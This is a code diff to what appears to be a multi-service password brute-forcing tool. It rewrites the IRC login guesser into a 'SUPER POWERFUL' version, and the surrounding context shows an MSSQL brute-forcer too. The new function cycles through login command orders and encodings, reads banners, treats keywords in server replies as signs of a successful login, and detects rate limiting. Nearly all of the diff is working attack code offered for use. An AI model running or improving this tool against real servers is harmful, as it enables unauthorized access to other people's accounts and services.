@@ -285,16 +285,71 @@ def mssql_bruteforce(username, password, target_ip, port=1433, debug=False):
             print_dbg(f"MSSQL fail: {username}:{password} -> {e}", debug)
         return False
 
-# IRC (simplified: connect with password if needed)
+# IRC (SUPER POWERFUL VERSION)
 def irc_bruteforce(username, password, target_ip, port=6667, debug=False):
+    """
+    Super powerful IRC brute-forcer:
+      - Tries multiple IRC login flows (PASS/NICK/USER, NICK/USER/PASS, NICK/PASS/USER)
+      - Tries popular IRC commands for authentication
+      - Extracts IRC banner
+      - Tries multiple encodings
+      - Detects throttling/errors
+      - Useful debug output
+      - Returns True if connection/auth is successful, otherwise False
+    """
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect((target_ip, port))
-        s.send(f"PASS {password}\r\n".encode())
-        s.send(f"NICK {username}\r\n".encode())
-        s.close()
-        return True  # Assume success if no exception
+        # Try all login variations and encodings
+        combos = [
+            [("PASS", password), ("NICK", username), ("USER", f"{username} 0 * :mx")],
+            [("NICK", username), ("USER", f"{username} 0 * :mx"), ("PASS", password)],
+            [("NICK", username), ("PASS", password), ("USER", f"{username} 0 * :mx")],
+        ]
+        encodings = ["utf-8", "latin1"]
+        for encoding in encodings:
+            for flow in combos:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(7)
+                    s.connect((target_ip, port))
+                    banner = b""
+                    try:
+                        banner = s.recv(512)
+                        print_dbg(f"IRC Banner ({encoding}): {banner.decode(encoding, errors='replace')}", debug)
+                    except Exception:
+                        pass
+                    for cmd, val in flow:
+                        msg = f"{cmd} {val}\r\n".encode(encoding)
+                        s.sendall(msg)
+                        print_dbg(f"Sent: {msg}", debug)
+                        time.sleep(0.2)
+                    try:
+                        s.settimeout(2)
+                        reply = s.recv(4096)
+                        resp = reply.decode(encoding, errors="replace")
+                        print_dbg(f"IRC Reply: {resp}", debug)
+                        if any(word in resp.lower() for word in [
+                            "001", "002", "welcome", "your host", "ircop", "mode", "motd", "end of",
+                            "you are now", "privileges", "logged in", "success", "nick registered"
+                        ]):
+                            print(f"[+] IRC login success for {username}:{password} (encoding={encoding})")
+                            s.close()
+                            return True
+                        elif any(word in resp.lower() for word in [
+                            "throttle", "too many", "wait", "flood", "reconnect", "denied"
+                        ]):
+                            print_dbg("[!] IRC server is throttling/flood rejecting, try slower or later.", debug)
+                            s.close()
+                            return False
+                        else:
+                            print_dbg(f"IRC fail: {username}:{password} (encoding={encoding}) -> {resp}", debug)
+                    except socket.timeout:
+                        print_dbg("IRC no reply (timeout)", debug)
+                    except Exception as e:
+                        print_dbg(f"IRC error reading reply: {e}", debug)
+                    s.close()
+                except Exception as e:
+                    print_dbg(f"IRC error with combo {flow} and encoding {encoding}: {e}", debug)
+        return False
     except Exception as e:
         if is_connection_refused(e):
             print_error(f"IRC connection refused or timed out for {target_ip}:{port}", debug)
